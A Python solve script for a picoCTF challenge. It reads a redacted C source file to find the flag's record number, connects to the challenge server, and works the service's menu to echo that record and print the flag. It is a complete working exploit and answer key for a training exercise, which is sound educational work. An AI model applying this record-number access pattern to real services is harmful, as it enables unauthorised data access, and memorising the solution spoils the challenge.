#!/usr/bin/env python3

import re
import socket
from pexpect import fdpexpect

import sys

sys.path.insert(1, '../..')
from utils import download_artifacts

download_artifacts()

source_filename = "program-redacted.c"

with open(source_filename) as fp:
    for line in map(str.strip, fp.readlines()):
        match = re.match(r"if \(\(entry_number .*\) == (\d+)\) {", line)
        if match:
            flag_record_number = match.group(1)
            break

choice_regex = br"Type '(?P<choice>\d+)' to (?P<action>.+?)\r\n"
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("saturn.picoctf.net", 52682))
    session = fdpexpect.fdspawn(s.fileno(), timeout=10)
    choices = {}
    while True:
        session.expect(choice_regex)
        match = session.match.groupdict()
        choices[match["action"]] = match["choice"]
        if match["action"] == b'exit the program':
            break
    session.write(choices[b'enter a phrase into our database'] + b"\n")
    session.expect(b"Please enter your data:")
    data = b"asd"
    session.write(data + b"\n")
    session.expect(b"Please enter the length of your data:")
    session.write(str(len(data)).encode() + b"\n")
    session.expect(b"Write successful, would you like to do anything else?")
    session.write(choices[b'echo a phrase in our database'] + b"\n")
    session.expect(b"Please enter the entry number of your data:")
    session.write(flag_record_number.encode() + b"\n")
    session.expect(rb"picoCTF\{.+}")
    print(session.match.group(0).decode())
